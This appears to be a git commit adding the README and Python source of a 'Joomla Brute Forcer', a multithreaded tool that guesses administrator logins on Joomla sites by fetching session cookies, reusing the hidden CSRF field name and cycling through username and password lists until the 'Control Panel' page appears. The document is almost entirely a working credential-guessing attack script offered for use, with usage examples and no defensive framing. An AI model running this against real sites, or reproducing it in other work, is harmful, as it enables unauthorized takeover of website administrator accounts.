92ec8e46c53af7f876280cabc84faa2bfa148a94
Emre Gül <emregl246@outlook.com.tr>
2024-09-08 19:51:27 +0300

    Project framework has been set up

---
+++ README.md
@@ -0,0 +1,42 @@
+<div align="center">
+  <img src="img/joomla_brute_forcer.png" alt="Logo" width="150" height="150">
+  <h2>JOOMLA BRUTE FORCER</h2>
+
+<h4>
+    <a href="https://github.com/emre-mr246/Joomla-Brute-Forcer/issues">❔ Ask a Question</a>
+  <span> · </span>
+    <a href="https://github.com/emre-mr246/Joomla-Brute-Forcer/issues">🪲 Report Bug</a>
+  <span> · </span>
+    <a href="https://github.com/emre-mr246/Joomla-Brute-Forcer/issues">💬 Request Feature</a>
+</h4>
+</div>
+
+## Introduction 🚀
+
+The "Joomla Brute Forcer" can perform a brute force attack on the Joomla admin panel using dynamically generated CSRF tokens and cookies, leveraging a high number of threads.
+
+## Requirements 📚
+
+To run this script, you need to have the following Python packages installed:
+
+requests: For making HTTP requests.
+beautifulsoup4: For parsing HTML and XML documents.
+If these packages are not already installed on your system, you can install them using pip. Run the following command in your terminal:
+
+`pip install requests beautifulsoup4`
+
+## Arguments 📚
+
+`-u/--url:` URL. Example: http://test.com
+`-p:` Only one password
+`-P:` Passwordlist
+`-l:` Only one username
+`-L:` Userlist
+`--proxy:` Proxy. Example: http://127.0.0.1:8080
+`-t/--thread:` Number of threads.
+
+## Usage 🔍
+
+1.  In the project's main directory, compile the library using the `make` command.
+   `$ python3 joomla_brute_forcer.py -u http://test.com -P passwordlist -l admin --proxy 127.0.0.1:8080 -t 10` 
+
---
+++ joomla_brute_forcer.py
@@ -0,0 +1,173 @@
+#!/usr/bin/python3
+
+import requests
+import argparse
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse
+import threading
+from queue import Queue
+import random
+import string
+
+
+def generate_random_string(length):
+    characters = string.ascii_letters + string.digits + string.punctuation
+    return "".join(random.choice(characters) for _ in range(length))
+
+
+class JoomlaBruteforce:
+    def __init__(self):
+        self.args = self.parse_arguments()
+        self.proxy = self.get_proxy()
+        self.queue = Queue()
+        self.lock = threading.Lock()
+        self.success = False
+        self.payload_attempts = 0
+        self.bruteforce()
+
+    def parse_arguments(self):
+        parser = argparse.ArgumentParser(description="Joomla login bruteforce")
+        parser.add_argument("-u", "--url", required=True, type=str, help="Joomla site")
+
+        passgroup = parser.add_mutually_exclusive_group(required=True)
+        passgroup.add_argument("-p", type=str, help="One single password")
+        passgroup.add_argument("-P", "--passlist", type=str, help="Password list")
+
+        usergroup = parser.add_mutually_exclusive_group(required=True)
+        usergroup.add_argument("-l", "--user", type=str, help="One single username")
+        usergroup.add_argument("-L", "--userlist", type=str, help="Username list")
+
+        parser.add_argument(
+            "--proxy", type=str, help="Specify proxy. Optional. http://127.0.0.1:8080"
+        )
+        parser.add_argument(
+            "-t",
+            "--thread",
+            type=int,
+            help="Number of threads.",
+        )
+
+        return parser.parse_args()
+
+    def get_proxy(self):
+        if self.args.proxy:
+            parsed_proxy = urlparse(self.args.proxy)
+            return {parsed_proxy.scheme: parsed_proxy.netloc}
+        return None
+
+    def get_initial_cookies(self):
+        try:
+            response = requests.get(
+                self.args.url + "/administrator/", proxies=self.proxy
+            )
+            response.raise_for_status()
+            return response.cookies.get_dict()
+        except requests.RequestException as e:
+            print(f"Error fetching initial cookies: {e}")
+            exit(1)
+
+    def bruteforce(self):
+        users = self.get_users()
+        passwords = self.get_passwords()
+
+        for user in users:
+            for password in passwords:
+                self.queue.put((user, password))
+
+        threads = []
+        if not self.args.thread:
+            self.args.thread = 10
+        for _ in range(self.args.thread):
+            thread = threading.Thread(target=self.handle_login_attempts)
+            thread.start()
+            threads.append(thread)
+
+        for thread in threads:
+            thread.join()
+
+    def get_users(self):
+        if self.args.userlist:
+            with open(self.args.userlist, "r", encoding="utf-8") as file:
+                return file.read().splitlines()
+        return [self.args.user]
+
+    def get_passwords(self):
+        try:
+            with open(self.args.passlist, "r", encoding="utf-8") as file:
+                return file.read().splitlines()
+        except FileNotFoundError as e:
+            print(f"Passlist not found: {e}")
+            exit(1)
+
+    def handle_login_attempts(self):
+
+        session = requests.Session()
+
+        while not self.queue.empty():
+            user, password = self.queue.get()
+
+            if self.attempt_login(session, user, password):
+                with self.lock:
+                    if not self.success:
+                        self.success = True
+                        print(f"Success: {user}:{password}")
+                        self.queue.queue.clear()
+                        return
+
+            with self.lock:
+                if not self.success:
+                    self.payload_attempts += 1
+                    if self.payload_attempts % 1 == 0:
+                        print(f"Payloads attempted: {self.payload_attempts}")
+
+            self.queue.task_done()
+
+    def attempt_login(self, session, username, password):
+        try:
+            headers = {"User-Agent": "Joomla Password Finder"}
+
+            cookie = session.get(self.args.url).cookies.get_dict()
+
+            response = session.get(
+                self.args.url + "/administrator/",
+                proxies=self.proxy,
+                cookies=cookie,
+                headers=headers,
+            )
+            response.raise_for_status()
+
+            soup = BeautifulSoup(response.text, "html.parser")
+            csrf_token_elements = soup.find_all("input", type="hidden")
+            if not csrf_token_elements:
+                print("No CSRF token found.")
+                return False
+
+            csrf_token_name = csrf_token_elements[-1].get("name")
+
+            data = {
+                "username": username,
+                "passwd": password,
+                "option": "com_login",
+                "task": "login",
+                "return": "aW5kZXgucGhw",
+                csrf_token_name: 1,
+            }
+
+            response = session.post(
+                self.args.url + "/administrator/",
+                data=data,
+                proxies=self.proxy,
+                headers=headers,
+            )
+            soup = BeautifulSoup(response.text, "html.parser")
+            panel_message = soup.find(string="Control Panel")
+            if panel_message:
+                return True
+            return False
+
+        except Exception as e:
+            return False
+
+
+if __name__ == "__main__":
+    JoomlaBruteforce()
